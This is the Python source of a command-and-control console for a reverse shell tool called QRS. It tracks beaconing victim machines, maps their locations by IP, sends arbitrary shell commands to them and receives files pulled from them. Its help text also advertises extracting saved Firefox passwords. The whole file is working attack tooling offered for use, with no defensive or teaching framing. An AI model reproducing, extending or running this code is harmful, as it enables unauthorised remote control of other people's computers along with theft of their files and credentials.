import socket
import time
import tqdm
import os
import threading
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
import subprocess
import tabulate
import random
import requests
from urllib.request import urlopen
import folium
import webbrowser
import re as r

SEPARATOR = "<sep>"  # For separating filename and filesize
HelpList = ["This is a List of all available commands", "===================Description====================\n",
            "QRS a fully interactive Reverse Shell for Windows CMD so you can use any CMD commands",
            "=====================Commands=====================\n",
            '============Terminal Commands=============',
            "Connections - Shows all active connections and their status",
            "Connect <client_ID> - Connects to the specified client ID",
            "Clear - Clears the screen",
            "Clear connections - Clears all connections from the list",
            "Clear inactive - Clears all inactive connections from the list",
            "Update - Updates QRS to the latest version from the repository",
            "Exit - Exits the reverse shell",
            "Quit - Quits QRS",
            "Help - Shows this message",
            "============In Shell commands=============", 
            "Start file server - Starts a file server to receive files from the target machine",
            "Download <filename> - Downloads a file from the target machine to the local machine into /received_files",
            "extract passwords firefox (<profile-ID>) - Extracts saved passwords from Firefox (provide profile ID if needed)",
            "ping - Pings the target machine\n",
            ]

client_id = 0
clients = []
connect = False
cwd = ""

# HTTP Server for Ping
class SimpleHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Override log_message to suppress default logging
        return  # Do nothing or implement custom logging if needed
    log_message(None, None, None)
    def do_GET(self):
        global clients, client_id, connect
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)

        client_address = self.client_address

        found = False
        for client in clients:
            if client.client_address[0] == client_address[0]:
                client.last_active_time = time.time()
                client.status = "ACTIVE"
                found = True
                if connect:
                    response = "connect"
                    connect = False
                else:
                    response = "notted"
                break
        if not found:
            clients.append(Client(None, client_address, client_id))
            client_id += 1
            print(f"\n{client_address[0]}:{client_address[1]} Connected!")

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        try:
            
            self.wfile.write(response.encode())
        except Exception as e:
            self.wfile.write("notted".encode())


# Start HTTP Server in Background
def start_http_server():
    global httpd
    httpd = HTTPServer(('0.0.0.0', 5000), SimpleHandler)
    print(f"\nPing server started on 0.0.0.0:5000")
    httpd.serve_forever()
def stop_http_server():
    global httpd
    if httpd:
        httpd.shutdown()
        httpd = None
        print("[*] Stopped http-ping server")

# Client Class
class Client:
    def __init__(self, client_socket, client_address, client_id=0):
        self.client_socket = client_socket
        self.client_address = client_address
        self.client_id = client_id
        self.connection_time = time.time()
        self.last_active_time = self.connection_time
        self.status = "ACTIVE"

    def get_connection_duration(self):
        return time.time() - self.connection_time

    def get_last_connection_duration(self):
        return time.time() - self.last_active_time

    def GetStatus(self):
        if self.get_last_connection_duration() < 6:
            return "ACTIVE"
        else:
            return "INACTIVE"

    def __str__(self):
        Active = self.GetStatus()
        self.status = Active
        connection_duration = self.get_connection_duration()
        last_connection_duration = self.get_last_connection_duration()
        connection_time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.connection_time))
        if Active != "INACTIVE":
            return f"Client ID : {self.client_id} : ACTIVE for {connection_duration:.2f} sec [Address: {self.client_address}, Connected at: {connection_time_str} ({FormatTime(connection_duration)} ago)]"
        else:
            return f"Client ID : {self.client_id} : INACTIVE for {last_connection_duration:.2f} sec [Address: {self.client_address}, Connected at: {connection_time_str} ({FormatTime(last_connection_duration)} ago), last active at: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.last_active_time))} ({FormatTime(connection_duration - last_connection_duration)} ago)]"


# Mapping
def MapConnections(connections):
    map_object = folium.Map(location=[20, 0], zoom_start=2, tiles="CartoDB dark_matter")

    for connection in connections:
        ip = connection.client_address[0]
        if ip != "127.0.0.1" and ip != "0.0.0.0":
            pass
        else:
            ip = str(getIP())

        try:
            response = requests.get(f'https://ipwho.is/{ip}', timeout=5)
            data = response.json()
            if not data.get("success"):
                print(f"[!] Failed to locate IP: {ip}")
                continue
            else:
                print(f"[+] IP: {ip} - City: {data["city"]}")


            lat = data["latitude"]
            lon = data["longitude"]
            city = data.get("city", "Unknown")
            country = data.get("country", "")
            status = connection.GetStatus()

            popup_html = f"""
                <b>Client ID:</b> {connection.client_id}<br>
                <b>Status:</b> {status}<br>
                <b>IP:</b> {ip}<br>
                <b>Location:</b> {city}, {country}
            """

            # Add a circle to represent the approximate city area
            folium.Circle(
                location=[lat, lon],
                radius=8000,  # ~8km radius
                color='darkred',
                fill=True,
                fill_opacity=0.25,
                popup=f"Approx. location: {city}"
            ).add_to(map_object)

            # Add the actual pin for the client
            folium.Marker(
                location=[lat, lon],
                popup=folium.Popup(popup_html, max_width=300),
                tooltip=f"Client {connection.client_id} ({status})",
                icon=folium.Icon(color="red" if status == "ACTIVE" else "red", icon="user")
            ).add_to(map_object)

        except Exception as e:
            print(f"[!] Error mapping IP {ip}: {e}")

    map_object.save("clients_map.html")
    print("[*] Map saved as clients_map.html")

# Formating
def TimeStamp():
    return f"[{time.strftime('%H:%M:%S', time.localtime())}]"
def FormatTime(seconds):
    if seconds/60 > 1:
        return time.strftime('%Mm, %Ss', time.gmtime(seconds))
    elif seconds/3600 > 1:
        return time.strftime('%Hh, %Mm, %Ss', time.gmtime(seconds))
    elif seconds/86400 > 1:
        return time.strftime('%Dd, %Hh, %Mm, %Ss', time.gmtime(seconds))
    else:
        return time.strftime('%Ss', time.gmtime(seconds))

# Server for File Download
def StartServer(host='127.0.0.1', port=5005, output_folder='received_files'):
    global server_running
    server_running = True
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"[*] Listening on {host}:{port}...")

    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    while server_running:
        client_socket, client_address = server_socket.accept()
        print(f"[+] Connection from {client_address} has been established.")

        try:
            buffer = ""
            while SEPARATOR not in buffer:
                buffer += client_socket.recv(1024).decode('utf-8')

            filename, filesize_data = buffer.split(SEPARATOR, 1)
            if not filename or not filesize_data.isdigit():
                raise ValueError(f"Invalid filename or filesize received: '{buffer}'")
            print(f"[+] File server caught {filename}, size: {filesize_data} bytes")
            filesize = int(filesize_data)
            output_path = os.path.join(output_folder, filename)

            client_socket.send("READY".encode('utf-8'))

            with open(output_path, 'wb') as f:
                bytes_received = 0
                progress = tqdm.tqdm(total=filesize, desc=f"Downloading {filename}", unit="B", unit_scale=True,
                                     unit_divisor=1024)
                while bytes_received < filesize:
                    data = client_socket.recv(min(filesize - bytes_received, 1024))
                    if not data:
                        break
                    f.write(data)
                    bytes_received += len(data)
                    progress.update(len(data))
                progress.close()

            print(f"[+] Downloaded {filename} to {output_path}")

        except ValueError as e:
            print(f"[!] Error: {e}")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
        finally:
            client_socket.close()


# Support
def start_file_server_in_thread():
    global file_server
    server_thread = threading.Thread(target=StartServer, args=(SERVER_HOST, 5005), daemon=True)
    server_thread.start()
    print(f"{TimeStamp()} File Server is active on {SERVER_HOST}:5005")
def stop_file_server():
    global server_running
    server_running = False
    print("[*] Stopping file-server...")
def getIP():
    d = str(urlopen('http://checkip.dyndns.com/').read())

    return r.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(d).group(1)

def __str__(clients):
    if len(clients) == 0:
        print(f"{TimeStamp()} No connections found.")
    else:
        print(f"{TimeStamp()} Found {len(clients)} connection(s):")
        table = []
        for client in clients:
            connection_time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(client.connection_time))
            if client.GetStatus() == "ACTIVE":
                table.append([client.client_id, client.client_address[0], client.client_address[1], client.GetStatus(), f"{connection_time_str} ({FormatTime(client.get_connection_duration())} ago)", "N/A"])
            else:
                table.append([client.client_id, client.client_address[0], client.client_address[1], client.GetStatus(), f"{connection_time_str} ({FormatTime(client.get_connection_duration())} ago)", f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(client.last_active_time))} ({FormatTime(client.get_connection_duration() - client.get_last_connection_duration())} ago)"])
        print(f"\n{tabulate.tabulate(table, headers=["Client ID", "IP Address", "Port", "Status", "Connected At", "Last active at"], tablefmt="presto")}\n")


def RemoveInactiveClients():
    global clients
    s = 0
    for client in clients:
        if client.GetStatus() == "INACTIVE":
            print(f"[*] Removing inactive client {client.client_id} from the list.")
            clients.remove(client)
            s += 1
    print(f"\n{TimeStamp()} Removed {s} inactive client(s) from the list.")

def CheckForUpdates(repo_path='.', branch='main', version_file='version.txt'):
    original_cwd = os.getcwd()
    os.chdir(repo_path)

    try:
        # Fetch remote without printing anything
        subprocess.run(['git', 'fetch'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

        # Get local and remote commit hashes
        local_commit = subprocess.check_output(
            ['git', 'rev-parse', branch],
            stderr=subprocess.DEVNULL
        ).strip()
        remote_commit = subprocess.check_output(
            ['git', 'rev-parse', f'origin/{branch}'],
            stderr=subprocess.DEVNULL
        ).strip()

        # Get local version
        local_version = "unknown"
        if os.path.exists(version_file):
            with open(version_file) as f:
                local_version = f.read().strip()

        # Get remote version
        try:
            remote_version = subprocess.check_output(
                ['git', 'show', f'origin/{branch}:{version_file}'],
                stderr=subprocess.DEVNULL
            ).decode().strip()
        except subprocess.CalledProcessError:
            remote_version = "unknown"

        # Show status
        if local_commit != remote_commit:
            print(f"[!] Update available. {local_version} > {remote_version}")
        else:
            print(f"[✓] You're up to date. Version: {local_version}")

    except subprocess.CalledProcessError as e:
        print(f"[X] Git error: {e}")
    finally:
        os.chdir(original_cwd)


def StopServices():
    print(f"\n[*] Stopping services...")
    stop_http_server()
    stop_file_server()
    print(f"{TimeStamp()} services stopped.")


SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 5 * 1024 * 1024  # 5MB for ouput buffer size, feel free to increase

# Start HTTP Server in the Background
http_server_thread = threading.Thread(target=start_http_server, daemon=True)
http_server_thread.start()

# Banner
banners = os.listdir("./banners")
if len(banners) > 0:
    with open(f"./banners/{random.choice(banners)}", "r", encoding="utf-8") as f:
        print(f.read())
else:
    print("[!] Failed to load banner.")


# Welcome Message
print(f"QRS Started on {SERVER_HOST}:{SERVER_PORT} at {TimeStamp()}")
print(f"Welcome to QRS a Python-based reverse shell!")
print("Type 'help' to see the available commands.")
print("--------------------------------------------------")
CheckForUpdates()
print("\n")
while True:
    cmd = input(f"{TimeStamp()} $> ")
    if not cmd.strip():
        continue
    if cmd.lower() == "exit":
        break
    if cmd.lower() == "help":
        for i in HelpList:
            print(i + "\n")
        continue
    if cmd.lower() == "connections":
        __str__(clients)
        continue
    if cmd.lower() == "update":
        print(f"{TimeStamp()} Updating QRS...")
        try:
            subprocess.run("git pull https://github.com/the-real-N0NAME/QRS.git", shell=True, check=True)
            print(f"{TimeStamp()} QRS updated successfully. Restarting...")
            StopServices()
            print(f"{TimeStamp()} Restarting QRS in 3 sec...")
            time.sleep(3)
            os.system("cls" if os.name == "nt" else "clear")
            subprocess.run("python QRS.py", shell=True, check=True)
            exit(0)
        except subprocess.CalledProcessError as e:
            print(f"[!] Error occurred while updating QRS: {e.stderr}")
    if cmd.lower() == "quit":
        print(f"{TimeStamp()} Quitting QRS...")
        exit(0)

    SplitedCMD = cmd.split()
    if SplitedCMD[0].lower() == "clear":
        if len(SplitedCMD) < 2:
            os.system("cls" if os.name == "nt" else "clear")
        elif SplitedCMD[1].lower() == "connections":
            print(f"{TimeStamp()} Clearing connection(s)...")
            clearedConnections = len(clients)
            clients.clear()
            print(f"{TimeStamp()} {clearedConnections} Connection(s) cleared.")
        elif SplitedCMD[1].lower() == "inactive":
            print(f"{TimeStamp()} Clearing inactive connections...")
            RemoveInactiveClients()
    if SplitedCMD[0].lower() == "map":
        if SplitedCMD[1].lower() == "connections":
            print(f"{TimeStamp()} Mapping connections...")
            MapConnections(clients)
            try:
                webbrowser.open('clients_map.html')
                print("[*] Map opened in web browser.")
            except FileNotFoundError:
                print("[!] Map file not found.")
    if SplitedCMD[0].lower() == "connect":
        local_client_ID = int(SplitedCMD[1])
        if local_client_ID >= len(clients) or local_client_ID < 0:
            print("Invalid client ID.")
            continue

        client = clients[local_client_ID]
        if client.GetStatus() == "INACTIVE":
            print(f"Client {local_client_ID} is inactive. Removing from the list.")
            clients.pop(local_client_ID)
            continue

        print(f"{TimeStamp()} Connecting to {client.client_address[0]}:{client.client_address[1]}...")
        connect = True

        s = socket.socket()
        s.bind((SERVER_HOST, SERVER_PORT))
        print(f"{TimeStamp()} Waiting for client({client.client_address[0]}) connection on {SERVER_HOST}:{SERVER_PORT} ...")
        s.listen(5)
        s.settimeout(5)
        while True:
            try:
                client_socket, client_address = s.accept()
                print(f"{TimeStamp()} {client_address[0]}:{client_address[1]} Connection established!")
                # Connection Command Loop

                cwd = client_socket.recv(BUFFER_SIZE).decode()
                while True:
                    cmd = input(f"{cwd} $> ")
                    if not cmd.strip():
                        continue
                    SplitedCMD = cmd.split()
                    if SplitedCMD[0].lower() == "type":
                        print(f"[*] The Buffer size is currently set to {BUFFER_SIZE/1000000} MB. If you want to see larger files use the 'download' command.")
                    if cmd.lower() == "help":
                        for i in HelpList:
                            print(i)
                            print("\n")
                        continue     
                    if cmd.lower() == "start file server":
                        print(f"{TimeStamp()} Starting File Server ...")
                        start_file_server_in_thread()
                        continue
                    client_socket.send(cmd.encode())
                    output = client_socket.recv(BUFFER_SIZE).decode()
                    
                    # Send exit before exiting to ensure the client is also closed
                    if cmd.lower() == "exit":
                        break
                    try:
                        results, cwd = output.split(SEPARATOR)
                    except ValueError as e:
                        if "not enough values to unpack" in str(e):
                            results = f"[E] The output received from the client is most likely to long use '-f' flag at the end of the command to save the output to a file, {e}"
                    except Exception as e:
                        results = f"[!] Error occurred while receiving data: {e}"
                    print(results)
                break
            except socket.timeout:
                print(f"[!] Connection timed out. There was en error on the client side.")
                break
            except Exception as e:
                print(f"[!] Server side Error occurred: {e}")
                break
